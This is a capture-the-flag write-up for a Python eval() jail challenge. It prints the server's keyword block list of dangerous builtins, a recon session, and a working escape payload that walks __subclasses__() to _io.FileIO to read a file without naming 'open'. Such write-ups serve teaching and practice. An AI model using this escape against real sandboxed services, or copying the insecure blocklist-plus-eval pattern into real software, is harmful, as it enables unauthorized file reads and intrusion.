# PyJail

| Field | Value |
|-------|-------|
| Category | Misc |
| Points | 175 |

## Description

> We've built a Python REPL with dangerous builtins blocked.
> Can you still read the flag?
>
> `nc <host> 4447`
>
> Attachment: `pyjail.py` (source given to players)

## Solution

# PyJail — Writeup (Medium MISC / Python Jail Escape)

## Challenge Overview

A Python REPL runs on a remote server. Every expression is passed through
`eval()`. Before evaluation, the input is checked for banned keywords.

The goal: read `flag.txt` despite the filter.

**Server source (given to players):**
```python
BANNED = [
    'import', 'open', 'os', 'exec', 'eval',
    'system', 'popen', 'subprocess',
    'breakpoint', 'compile',
    'getattr', 'setattr', '__builtins__', 'builtins',
    'globals', 'vars', 'locals', '__import__',
]

result = eval(line, {"__builtins__": __builtins__}, {})
```

---

## Step 1 — Reconnaissance

```
$ nc <host> 4447
=== PyJail v1 ===
Some builtins have been blocked. Flag is in flag.txt.
>>> 1+1
2
>>> open('flag.txt')
[!] 'open' is blocked.
>>> getattr(__builtins__, 'open')
[!] 'getattr' is blocked.
>>> __builtins__
[!] '__builtins__' is blocked.
>>> globals()
[!] 'globals' is blocked.
```

All direct routes to builtins are blocked. `__builtins__` is blocked as a
name, `getattr` is blocked, `globals`/`vars`/`locals` are blocked.

However, `__builtins__` is still **passed in** as the context — meaning every
builtin function still exists in the `eval` environment. We just can't
*name* it directly.

---

## Step 2 — Python Object Model Escape

Python's object system provides an alternative route. Every object has a
`__class__`, every class has `__bases__`, and every class has `__subclasses__()`.

The chain from any tuple literal to `object`:

```python
()              # a tuple
().__class__    # <class 'tuple'>
().__class__.__bases__[0]   # <class 'object'>
```

`object.__subclasses__()` returns every class that directly inherits from
`object`. Among those is `_io._IOBase`. Following the inheritance tree:

```
object
  └─ _IOBase
       └─ _RawIOBase
            └─ FileIO    ← can open a file by path (no 'open' needed)
```

None of these class names contain any banned keyword.

---

## Step 3 — Build the Exploit

Walk the chain in a single nested comprehension:

```python
[a for a in
  [b for b in
    [c for c in ().__class__.__bases__[0].__subclasses__()
      if c.__name__ == '_IOBase'][0].__subclasses__()
    if b.__name__ == '_RawIOBase'][0].__subclasses__()
  if a.__name__ == 'FileIO'][0]('flag.txt').read()
```

Verify none of the substrings trigger a ban:
- `__subclasses__` — not in BANNED ✓
- `_IOBase`, `_RawIOBase`, `FileIO` — not in BANNED ✓
- `'flag.txt'` — not in BANNED ✓

---

## Step 4 — Run

```
>>> [a for a in [b for b in [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='_IOBase'][0].__subclasses__() if b.__name__=='_RawIOBase'][0].__subclasses__() if a.__name__=='FileIO'][0]('flag.txt').read()
b'CHC{pyjail_<hex>}\n'
```

`FileIO` returns bytes; the flag is wrapped in `b'...'`. Decode to get the
plain string.

Automated:

```python
$ python3 solve.py <host> 4447
[+] Flag: CHC{pyjail_<random_hex>}
```

---

## Key Concepts Covered

- Python `eval()` jail with extended string keyword blocklist
- Blocked paths: `getattr`, `__builtins__`, `globals`, string concat bypass
- Python MRO and `__subclasses__()` traversal as an escape route
- `_io.FileIO` as a way to open files without the `open` builtin
- Understanding which builtins are still *available* even when their *names* are blocked

**Flag format:** `CHC{pyjail_<24-char hex>}` (dynamic per container)

